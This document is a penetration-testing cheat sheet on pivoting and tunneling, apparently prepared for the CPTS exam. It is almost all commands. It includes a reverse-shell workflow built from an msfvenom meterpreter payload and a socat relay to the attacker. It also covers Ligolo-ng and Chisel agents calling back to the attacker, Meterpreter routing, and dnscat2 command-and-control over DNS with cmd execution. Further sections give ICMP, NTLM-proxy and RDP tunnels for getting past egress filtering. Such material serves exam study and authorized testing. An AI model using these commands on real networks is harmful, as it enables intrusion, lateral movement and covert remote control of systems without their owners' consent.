# PHASE 10: PIVOTING & TUNNELING

> After compromising pivot host, enumerate NICs/routing, then tunnel.
> Always check for dual-homed hosts (ip a / ipconfig).

---

## 10.0 - Pivot Discovery
```bash
# On compromised host - check for additional networks
ip a                    # Linux
ipconfig /all           # Windows
route print             # Windows
ip route                # Linux

# Note all subnets not reachable from attack host
# These are pivot targets
```

## 10.1 - SSH Tunneling
```bash
# Local port forward (access remote service via local port)
ssh -L <local_port>:<target_service>:<service_port> user@<pivot>
ssh -L 3306:10.10.10.5:3306 user@pivot  # Access internal MySQL

# Remote port forward (expose local service to remote network - for reverse shells)
ssh -R <remote_port>:<local_service>:<local_port> user@<pivot>
ssh -R 8080:127.0.0.1:8080 user@pivot   # Expose local web server

# Full reverse shell workflow through pivot:
# 1. Create payload targeting pivot IP
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<pivot_ip> LPORT=4444 -f elf -o shell.elf
# 2. Transfer to pivot
scp shell.elf user@pivot:/tmp/
# 3. Set up socat relay on pivot
socat TCP-LISTEN:4444,fork TCP:<attacker>:4444
# 4. Start listener on attacker
msfconsole → use exploit/multi/handler → set payload → exploit
# 5. Run payload on target (connects to pivot:4444 → relayed to attacker:4444)

# Dynamic (SOCKS proxy)
ssh -D 1080 user@<pivot>

# Usage with proxychains
proxychains nmap -sT -Pn <internal_target>
proxychains curl http://<internal_target>
```

## 10.1b - Ligolo-ng (CPTS exam default pivot)

> Userland VPN-style tunneling. No proxychains needed — kernel routes traffic via TUN interface.
> Preferred over Chisel/SSH for CPTS exam: faster, supports UDP/ICMP, handles full subnets.

**Setup (one-time on attacker):**
```bash
# Create TUN interface
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```

**Run proxy (attacker):**
```bash
# Self-signed cert mode
./proxy -selfcert -laddr 0.0.0.0:11601

# In proxy console:
ligolo-ng » session                # List sessions
ligolo-ng » [select session]
[Agent] » ifconfig                 # See agent's interfaces
[Agent] » start                    # Start tunnel
```

**Run agent (on pivot host):**
```bash
# Linux pivot
./agent -connect <attacker>:11601 -ignore-cert &

# Windows pivot
.\agent.exe -connect <attacker>:11601 -ignore-cert
```

**Route internal subnet through tunnel (attacker):**
```bash
# After ifconfig on agent shows e.g. 172.16.5.0/23
sudo ip route add 172.16.5.0/23 dev ligolo

# Now hit internal hosts directly — no proxychains
nmap -sT -Pn 172.16.5.10
evil-winrm -i 172.16.5.10 -u user -p pass
xfreerdp /v:172.16.5.10 /u:user /p:pass
```

**Expose attacker port back to internal network (reverse listener):**
```bash
# In ligolo console (lets internal hosts reach attacker for callbacks/shells)
[Agent] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
[Agent] » listener_list

# Internal target connects to <pivot_internal_ip>:4444 → relayed to attacker:4444
```

**Double pivot (Agent A → Agent B):**
```bash
# Agent A on first pivot — already connected
# From Agent A's shell, run second agent connecting to Agent A's IP on next subnet
# OR: route a new ligolo proxy through first tunnel:

# 1. On attacker, expose proxy listen port into network A:
[AgentA] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
# 2. Run agent on Pivot B pointing at Pivot A's IP
./agent -connect <pivotA_ip>:11601 -ignore-cert
# 3. New session appears in ligolo console — select it, start, route subnet B
sudo ip route add <subnet_B> dev ligolo
```

**Cleanup:**
```bash
sudo ip route del <subnet> dev ligolo
sudo ip link set ligolo down
sudo ip tuntap del ligolo mode tun
```

## 10.2 - Chisel
```bash
# Server (attacker)
chisel server --reverse --port 8080

# Client (target - reverse SOCKS)
chisel client <attacker>:8080 R:socks

# Client (target - specific forward)
chisel client <attacker>:8080 R:3306:<internal_host>:3306
```

## 10.3 - Proxychains
```bash
# /etc/proxychains.conf
socks5 127.0.0.1 1080

# Usage
proxychains <command>
```

## 10.4 - Socat Relay
```bash
# Basic relay (redirect traffic from local port to target)
socat TCP-LISTEN:<local_port>,fork TCP:<target>:<target_port>

# Reverse shell redirect (pivot receives shell, forwards to attacker)
socat TCP-LISTEN:<pivot_port>,fork TCP:<attacker>:<attacker_port>

# Bind shell redirect (target has bind shell, pivot forwards to attacker)
socat TCP-LISTEN:<local_port>,fork TCP:<target>:<bind_port>
```

## 10.5 - Sshuttle (transparent proxy - no proxychains needed)
```bash
# Route entire subnet through pivot
sshuttle -r user@<pivot> <internal_subnet>
sshuttle -r user@pivot 10.10.10.0/24

# Now use tools directly (no proxychains wrapper)
nmap -sT -Pn 10.10.10.5
curl http://10.10.10.5
```

## 10.6 - Meterpreter Tunneling
```bash
# Auto-route (adds routes for all target subnets)
meterpreter > run autoroute -s 10.10.10.0/24
meterpreter > run autoroute -p  # Print routes

# SOCKS proxy via Meterpreter
use auxiliary/server/socks_proxy
set SRVPORT 1080
run
# Then: proxychains nmap -sT -Pn <internal>

# Port forwarding (local - access remote service locally)
meterpreter > portfwd add -L <local_port> -p <remote_port> -r <internal_host>

# Port forwarding (reverse - expose local to target)
meterpreter > portfwd add -R -L <local_port> -p <remote_port> -r <attacker>
```

## 10.7 - Plink.exe (SSH for Windows)
```bash
# Dynamic port forwarding from Windows target
plink -ssh -D 1080 user@<attacker>

# With Proxifier for full tool proxying
# Or use with proxychains on attacker side
```

## 10.8 - Windows Netsh Port Forwarding
```powershell
# On compromised Windows host
netsh interface portproxy add v4tov4 listenport=<local> listenaddress=0.0.0.0 connectport=<remote> connectaddress=<internal_host>
netsh interface portproxy show all
netsh interface portproxy delete v4tov4 listenport=<local>
```

## 10.9 - DNS Tunneling (Dnscat2)
> Use when only UDP/53 outbound is allowed (egress filtering). C2 over DNS TXT records, encrypted.

```bash
# Setup server (attacker, must control authoritative DNS or use IP+port direct)
git clone https://github.com/iagox86/dnscat2
cd dnscat2/server && sudo gem install bundler && sudo bundle install
sudo ruby dnscat2.rb --dns host=<attacker_ip>,port=53,domain=<your.domain> --no-cache
# Note the pre-shared secret printed — give to client

# Client (target) — PowerShell variant
git clone https://github.com/lukebaggett/dnscat2-powershell
# Transfer dnscat2.ps1 to target
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver <attacker_ip> -Domain <your.domain> \
  -PreSharedSecret <secret> -Exec cmd

# Server console
dnscat2> windows                          # list sessions
dnscat2> window -i 1                       # interact with session
dnscat2> session -i 1                      # alt interact
# Inside session — type cmd commands
```

## 10.10 - ICMP Tunneling (ptunnel-ng)
> Use when only ICMP echo allowed outbound. Tunnels TCP over ping packets.

```bash
# Build (attacker + pivot)
git clone https://github.com/utoni/ptunnel-ng
cd ptunnel-ng && sudo ./autogen.sh
# Static binary build (portable to pivot)
sudo apt install automake autoconf -y
sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
./autogen.sh

# Transfer to pivot
scp -r ptunnel-ng user@<pivot>:~/

# On pivot (run as root — privileged ICMP)
sudo ./ptunnel-ng -r<pivot_ip> -R22       # accept ICMP, forward to local SSH

# On attacker — connect through ICMP tunnel
sudo ./ptunnel-ng -p<pivot_ip> -l2222 -r<target_internal_ip> -R22
# Then SSH to attacker:2222 → tunneled via ICMP → reaches target_internal:22
ssh -p 2222 user@127.0.0.1
```

## 10.11 - Rpivot (Reverse SOCKS via Python, NTLM-aware)
> Pure Python (2.7). Use when corporate proxy with NTLM auth blocks direct outbound.

```bash
# Server (attacker)
git clone https://github.com/klsecservices/rpivot
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

# Client (pivot)
scp -r rpivot user@<pivot>:~/
python2.7 client.py --server-ip <attacker_ip> --server-port 9999

# Through NTLM proxy
python2.7 client.py --server-ip <attacker_ip> --server-port 9999 \
  --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port <proxy_port> \
  --domain <domain> --username <user> --password '<pass>'

# Configure proxychains.conf → socks5 127.0.0.1 9050
proxychains nmap -sT -Pn <internal>
```

## 10.12 - SocksOverRDP (RDP-as-transport SOCKS)
> Use when only RDP outbound allowed. RDP virtual channel becomes SOCKS proxy.

```powershell
# Server: SocksOverRDP-Plugin DLL loaded on attacker's RDP client (mstsc)
# 1. Download SocksOverRDP-x64.dll → register
regsvr32.exe SocksOverRDP-x64.dll
# 2. mstsc → connect to pivot host normally
# 3. Inside RDP session: run SocksOverRDP-Server.exe (binary on target)
.\SocksOverRDP-Server.exe
# 4. Attacker side now exposes 127.0.0.1:1080 SOCKS5 through RDP channel
# 5. proxychains config → socks5 127.0.0.1 1080
```